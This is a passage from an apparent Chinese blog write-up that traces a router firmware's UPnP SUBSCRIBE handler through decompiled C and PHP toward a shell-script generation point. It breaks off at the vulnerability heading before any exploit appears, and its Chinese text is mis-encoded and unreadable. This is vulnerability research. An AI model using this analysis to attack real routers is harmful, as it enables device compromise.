class="comment">#å°±æ˜¯å°†è¿™ä¸ªæŠ¥æ–‡ç»™sç„¶åæ‰§è¡Œxml()å‡½æ•°</span></span><br><span class="line">      v2,</span><br><span class="line">      a1,</span><br><span class="line">      v3,</span><br><span class="line">      v20,</span><br><span class="line">      <span class="string">&quot;/var/run&quot;</span>,</span><br><span class="line">      a1);</span><br><span class="line">    xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, s, stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )		<span class="comment">#æ— è®¢é˜…</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">    v9 = <span class="number">412</span>;</span><br><span class="line">    goto LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = strcmp(v6, <span class="string">&quot;upnp:event&quot;</span>);</span><br><span class="line">  v9 = <span class="number">412</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 || !v4 )		<span class="comment">#æ— å›è°ƒå’Œv6=upun:event</span></span><br><span class="line">    goto LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )		<span class="comment">#æœ‰è¶…æ—¶æ—¶é—´</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">400</span>;</span><br><span class="line">    goto LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v5, <span class="string">&quot;Second-infinite&quot;</span>) )		<span class="comment">#ç›¸ç­‰è¿”å›0</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = strncasecmp(v5, <span class="string">&quot;Second-&quot;</span>, 7u);		<span class="comment">##å¦‚æœv5=Second-infiniteè¿”å›0ï¼Œæ‰€ä»¥å½“v5=!æ—¶å…¶æ ¼å¼åº”ä¸ºsecond-XXX</span></span><br><span class="line">    v9 = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = atoi(v5 + <span class="number">7</span>);</span><br><span class="line">      goto LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">    cgibin_print_http_status(v9, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  v12 = &amp;v4[strlen(v4) - <span class="number">1</span>];		<span class="comment">#å¯¹URLå¤„ç†</span></span><br><span class="line">  <span class="keyword">if</span> ( *v12 == <span class="number">62</span> )</span><br><span class="line">    *v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = &amp;v4[*v4 == <span class="number">0x3C</span>];</span><br><span class="line">  v14 = strncmp(v13, <span class="string">&quot;http://&quot;</span>, 7u);</span><br><span class="line">  v9 = <span class="number">412</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    goto LABEL_27;</span><br><span class="line">  v15 = strchr(v13 + <span class="number">7</span>, <span class="number">47</span>);</span><br><span class="line">  v16 = v15;</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    goto LABEL_25;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  v17 = getpid();</span><br><span class="line">  snprintf(</span><br><span class="line">    s,</span><br><span class="line">    0x200u,</span><br><span class="line">    <span class="string">&quot;%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/htdocs/upnp/run.NOTIFY.php&quot;</span>,</span><br><span class="line">    v2,</span><br><span class="line">    a1,</span><br><span class="line">    v13 + <span class="number">7</span>,</span><br><span class="line">    v16 + <span class="number">1</span>,</span><br><span class="line">    v10,</span><br><span class="line">    v7,</span><br><span class="line">    <span class="string">&quot;/var/run&quot;</span>,</span><br><span class="line">    a1,</span><br><span class="line">    v17);</span><br><span class="line">  xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, s, stdout);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v18 = getpid();</span><br><span class="line">  snprintf(s, 0x200u, <span class="string">&quot;NOTIFY:0:sh %s/%s_%d.sh&quot;</span>, <span class="string">&quot;/var/run&quot;</span>, a1, v18);</span><br><span class="line">  xmldbc_timer(<span class="number">0</span>, <span class="number">0</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿½è¸ªxmldbc_ephp()ï¼Œa3æ˜¯ä½œä¸ºsï¼ˆæŠ¥æ–‡ç»§ç»­ä¼ é€’ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall xmldbc_ephp(<span class="built_in">int</span> a1, <span class="built_in">int</span> a2, const char *a3, <span class="built_in">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v6; // $v0</span><br><span class="line"></span><br><span class="line">  v6 = strlen(a3);</span><br><span class="line">  <span class="keyword">return</span> sub_414FB8(a1, <span class="number">10</span>, a2, a3, v6 + <span class="number">1</span>, a4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿½è¸ªsub_414fb8()å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall sub_414FB8(<span class="built_in">int</span> a1, __int16 a2, <span class="built_in">int</span> a3, <span class="built_in">int</span> a4, <span class="built_in">int</span> a5, FILE *a6)</span><br><span class="line">&#123;		<span class="comment">#a4æ˜¯æŠ¥æ–‡</span></span><br><span class="line">  <span class="built_in">int</span> v6; // $v0</span><br><span class="line">  <span class="built_in">int</span> v7; // $s1</span><br><span class="line">  <span class="built_in">int</span> v8; // $s0</span><br><span class="line">  FILE *v9; // $a1</span><br><span class="line"></span><br><span class="line">  v7 = -<span class="number">1</span>;</span><br><span class="line">  v6 = sub_4140BC();	<span class="comment">#æŸä¸ªç›‘å¬å‡½æ•°å¤„ç†</span></span><br><span class="line">  v8 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_41490C(v6, a2) &gt;= <span class="number">0</span> )		<span class="comment">#ç»‘å®šv6å’Œa2ï¼Œv6æ˜¯æŠ¥æ–‡é•¿åº¦ï¼Œa2æ˜¯10</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = a6;</span><br><span class="line">      <span class="keyword">if</span> ( !a6 )</span><br><span class="line">        v9 = stdout;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      sub_4146C8(v8, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    close(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿½è¸ªsub_41490C()å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall sub_41490C(<span class="built_in">int</span> fd, __int16 a2, <span class="built_in">int</span> a3, void *a4, __int16 a5)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v6; // $v0</span><br><span class="line">  <span class="built_in">int</span> v7; // $v1</span><br><span class="line">  <span class="built_in">int</span> v8; // $v0</span><br><span class="line">  _WORD buf[<span class="number">2</span>]; // [sp+18h] [-1Ch] BYREF</span><br><span class="line">  <span class="built_in">int</span> v11; // [sp+1Ch] [-18h]</span><br><span class="line">  <span class="built_in">int</span> v12; // [sp+20h] [-14h]</span><br><span class="line">  void *v13; // [sp+28h] [-Ch]</span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = a2;</span><br><span class="line">  v11 = a3;</span><br><span class="line">  v13 = a4;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = a5;</span><br><span class="line">  v6 = sub_41484C(fd, buf);</span><br><span class="line">  v7 = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sub_41484C(fd, v13);		<span class="comment">#v13æ˜¯æŠ¥æ–‡</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿½è¸ªsub_41484C()å‡½æ•°ï¼Œé€šè¿‡sendå‘é€æŠ¥æ–‡ç„¶åå‘ run.NOTIFY.php å‘äº†ä¸ªåŒ… </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">size_t __fastcall sub_41484C(<span class="built_in">int</span> fd, char *buf, size_t a3)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // $s0</span><br><span class="line">  ssize_t v7; // $v0</span><br><span class="line">  ssize_t v8; // $v1</span><br><span class="line">  <span class="built_in">bool</span> v9; // dc</span><br><span class="line">  size_t result; // $v0</span><br><span class="line">  <span class="built_in">int</span> *v11; // $v0</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = a3; ; i -= v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      <span class="keyword">return</span> a3;</span><br><span class="line">    v7 = send(fd, buf, i, <span class="number">0x4000</span>);		<span class="comment">#å‘é€æŠ¥æ–‡</span></span><br><span class="line">    v8 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v7 == <span class="number">0</span>;</span><br><span class="line">      result = -<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      v11 = _errno_location();</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v11 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    buf += v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="phpæŸ¥çœ‹"><a href="#phpæŸ¥çœ‹" class="headerlink" title="phpæŸ¥çœ‹"></a>phpæŸ¥çœ‹</h2><p>gena.php:æœ‰å„ä¸ªå‡½æ•°çš„åŠŸèƒ½æ¦‚è¿°</p>
<p>run.NOTIFY.phpï¼šå¯ä»¥çœ‹åˆ°è¯·æ±‚æ–¹å¼æ˜¯SUBSCRIBEæ—¶è¿›å…¥GENA_subscribe_new()å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/htdocs/phplib/upnp/xnode.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/htdocs/upnpinc/gvar.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/htdocs/upnpinc/gena.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$gena_path</span> = <span class="title function_ invoke__">XNODE_getpathbytarget</span>(<span class="variable">$G_GENA_NODEBASE</span>, <span class="string">&quot;inf&quot;</span>, <span class="string">&quot;uid&quot;</span>, <span class="variable">$INF_UID</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$gena_path</span> = <span class="variable">$gena_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$SERVICE</span>;</span><br><span class="line"><span class="title function_ invoke__">GENA_subscribe_cleanup</span>(<span class="variable">$gena_path</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IGD services */</span></span><br><span class="line"><span class="keyword">if</span>		(<span class="variable">$SERVICE</span> == <span class="string">&quot;L3Forwarding1&quot;</span>)	<span class="variable">$php</span> = <span class="string">&quot;NOTIFY.Layer3Forwarding.1.php&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$SERVICE</span> == <span class="string">&quot;OSInfo1&quot;</span>)			<span class="variable">$php</span> = <span class="string">&quot;NOTIFY.OSInfo.1.php&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$SERVICE</span> == <span class="string">&quot;WANCommonIFC1&quot;</span>)	<span class="variable">$php</span> = <span class="string">&quot;NOTIFY.WANCommonInterfaceConfig.1.php&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$SERVICE</span> == <span class="string">&quot;WANEthLinkC1&quot;</span>)	<span class="variable">$php</span> = <span class="string">&quot;NOTIFY.WANEthernetLinkConfig.1.php&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$SERVICE</span> == <span class="string">&quot;WANIPConn1&quot;</span>)		<span class="variable">$php</span> = <span class="string">&quot;NOTIFY.WANIPConnection.1.php&quot;</span>;</span><br><span class="line"><span class="comment">/* WFA services */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$SERVICE</span> == <span class="string">&quot;WFAWLANConfig1&quot;</span>)	<span class="variable">$php</span> = <span class="string">&quot;NOTIFY.WFAWLANConfig.1.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$METHOD</span> == <span class="string">&quot;SUBSCRIBE&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$SID</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">		<span class="title function_ invoke__">GENA_subscribe_new</span>(<span class="variable">$gena_path</span>, <span class="variable">$HOST</span>, <span class="variable">$REMOTE</span>, <span class="variable">$URI</span>, <span class="variable">$TIMEOUT</span>, <span class="variable">$SHELL_FILE</span>, <span class="string">&quot;/htdocs/upnp/&quot;</span>.<span class="variable">$php</span>, <span class="variable">$INF_UID</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="title function_ invoke__">GENA_subscribe_sid</span>(<span class="variable">$gena_path</span>, <span class="variable">$SID</span>,  <span class="variable">$TIMEOUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$METHOD</span> == <span class="string">&quot;UNSUBSCRIBE&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">GENA_unsubscribe</span>(<span class="variable">$gena_path</span>, <span class="variable">$SID</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>GENA_subscribe_new()å‡½æ•°ï¼šå“¦å¼ï¼Œå‘ç°äº†ä¸€ä¸ªè°ƒç”¨$shell_fileçš„å‡½æ•°GENA_notify_init()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GENA_subscribe_new</span>(<span class="params"><span class="variable">$node_base</span>, <span class="variable">$host</span>, <span class="variable">$remote</span>, <span class="variable">$uri</span>, <span class="variable">$timeout</span>, <span class="variable">$shell_file</span>, <span class="variable">$target_php</span>, <span class="variable">$inf_uid</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">anchor</span>(<span class="variable">$node_base</span>);</span><br><span class="line">	<span class="variable">$count</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;subscription#&quot;</span>);</span><br><span class="line">	<span class="variable">$found</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* find subscription index &amp; uuid */</span></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="string">&quot;subscription&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">query</span>(<span class="string">&quot;host&quot;</span>)==<span class="variable">$host</span> &amp;&amp; <span class="title function_ invoke__">query</span>(<span class="string">&quot;uri&quot;</span>)==<span class="variable">$uri</span>)	&#123;<span class="variable">$found</span> = <span class="variable">$InDeX</span>; <span class="keyword">break</span>;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$found</span> == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$index</span> = <span class="variable">$count</span> + <span class="number">1</span>;</span><br><span class="line">		<span class="variable">$new_uuid</span> = <span class="string">&quot;uuid:&quot;</span>.<span class="title function_ invoke__">query</span>(<span class="string">&quot;/runtime/genuuid&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$index</span> = <span class="variable">$found</span>;</span><br><span class="line">		<span class="variable">$new_uuid</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/uuid&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get timeout */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$timeout</span>==<span class="number">0</span> || <span class="variable">$timeout</span>==<span class="string">&quot;&quot;</span>) &#123;<span class="variable">$timeout</span> = <span class="number">0</span>; <span class="variable">$new_timeout</span> = <span class="number">0</span>;&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;<span class="variable">$new_timeout</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;/runtime/device/uptime&quot;</span>) + <span class="variable">$timeout</span>;&#125;</span><br><span class="line">	<span class="comment">/* set to nodes */</span></span><br><span class="line">	<span class="title function_ invoke__">set</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/remote&quot;</span>,	<span class="variable">$remote</span>);</span><br><span class="line">	<span class="title function_ invoke__">set</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/uuid&quot;</span>,		<span class="variable">$new_uuid</span>);</span><br><span class="line">	<span class="title function_ invoke__">set</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/host&quot;</span>,		<span class="variable">$host</span>);</span><br><span class="line">	<span class="title function_ invoke__">set</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/uri&quot;</span>,		<span class="variable">$uri</span>);</span><br><span class="line">	<span class="title function_ invoke__">set</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/timeout&quot;</span>,	<span class="variable">$new_timeout</span>);</span><br><span class="line">	<span class="title function_ invoke__">set</span>(<span class="string">&quot;subscription:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/seq&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">GENA_subscribe_http_resp</span>(<span class="variable">$new_uuid</span>, <span class="variable">$timeout</span>);</span><br><span class="line">	<span class="title function_ invoke__">GENA_notify_init</span>(<span class="variable">$shell_file</span>, <span class="variable">$target_php</span>, <span class="variable">$inf_uid</span>, <span class="variable">$host</span>, <span class="variable">$uri</span>, <span class="variable">$new_uuid</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GENA_notify_init():</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GENA_notify_init</span>(<span class="params"><span class="variable">$shell_file</span>, <span class="variable">$target_php</span>, <span class="variable">$inf_uid</span>, <span class="variable">$host</span>, <span class="variable">$uri</span>, <span class="variable">$sid</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$inf_path</span> = <span class="title function_ invoke__">XNODE_getpathbytarget</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;inf&quot;</span>, <span class="string">&quot;uid&quot;</span>, <span class="variable">$inf_uid</span>, <span class="number">0</span>);<span class="comment">//æ ¹æ®$inf_uidæŸ¥æ‰¾ç½‘ç»œæ¥å£é…ç½®è·¯åŠ²</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$inf_path</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;can&#x27;t find inf_path by <span class="subst">$inf_uid</span>=&quot;</span>.<span class="variable">$inf_uid</span>.<span class="string">&quot;!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$phyinf</span> = <span class="title function_ invoke__">PHYINF_getifname</span>(<span class="title function_ invoke__">query</span>(<span class="variable">$inf_path</span>.<span class="string">&quot;/phyinf&quot;</span>));<span class="comment">//è·å–ç‰©ç†æ¥å£å</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$phyinf</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;can&#x27;t get phyinf by <span class="subst">$inf_uid</span>=&quot;</span>.<span class="variable">$inf_uid</span>.<span class="string">&quot;!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$upnpmsg</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;/runtime/upnpmsg&quot;</span>);<span class="comment">//è·å–æ—¥å¿—æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$upnpmsg</span> == <span class="string">&quot;&quot;</span>) <span class="variable">$upnpmsg</span> = <span class="string">&quot;/dev/null&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(w, <span class="variable">$shell_file</span>,</span><br><span class="line">		<span class="string">&quot;#!/bin/sh\n&quot;</span>.//è¯´æ˜ç”Ÿæˆäº†ä¸€ä¸ª.shçš„æ–‡ä»¶</span><br><span class="line">		<span class="string">&#x27;echo &quot;[$0] ...&quot; &gt; &#x27;</span>.<span class="variable">$upnpmsg</span>.<span class="string">&quot;\n&quot;</span>.</span><br><span class="line">		<span class="string">&quot;xmldbc -P &quot;</span>.<span class="variable">$target_php</span>.</span><br><span class="line">			<span class="string">&quot; -V INF_UID=&quot;</span>.<span class="variable">$inf_uid</span>.</span><br><span class="line">			<span class="string">&quot; -V HDR_URL=&quot;</span>.<span class="title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="variable">$uri</span>).</span><br><span class="line">			<span class="string">&quot; -V HDR_HOST=&quot;</span>.<span class="title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="variable">$host</span>).</span><br><span class="line">			<span class="string">&quot; -V HDR_SID=&quot;</span>.<span class="title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="variable">$sid</span>).</span><br><span class="line">			<span class="string">&quot; -V HDR_SEQ=0&quot;</span>.</span><br><span class="line">			<span class="string">&quot; | httpc -i &quot;</span>.<span class="variable">$phyinf</span>.<span class="string">&quot; -d &quot;</span>.<span class="title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="variable">$host</span>).<span class="string">&quot; -p TCP &gt; &quot;</span>.<span class="variable">$upnpmsg</span>.<span class="string">&quot;\n&quot;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(a, <span class="variable">$shell_file</span>, <span class="string">&quot;rm -f &quot;</span>.<span class="variable">$shell_file</span>.<span class="string">&quot;\n&quot;</span>);	<span class="comment">//è„šæœ¬æ‰§è¡Œåè‡ªè¡Œåˆ é™¤</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h2><p>è¿™é‡Œè®²ä¸€ä¸ªshellçš„ç”¨æ³•</p>
